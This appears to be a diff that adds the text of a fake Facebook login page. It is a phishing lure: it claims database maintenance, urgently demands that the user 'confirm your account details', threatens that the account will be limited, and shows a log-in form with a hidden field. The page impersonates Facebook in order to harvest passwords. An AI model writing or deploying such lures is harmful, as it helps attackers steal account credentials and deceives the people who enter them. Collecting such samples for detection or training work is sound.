@@ -1,0 +1,13 @@
+Facebook
+Dear Facebook user
+We are performing usual maintenance to our database servers! You are required to confirm your account details today, otherwise your account might be limited without further notification!
+To continue to your confirm, please log in!
+HIDE
+SHOW
+Log In
+<input type="hidden" name="_fb_noscript" value="true" />
+or
+Create New Account
+Forgot Password?
+Â·
+Help Center
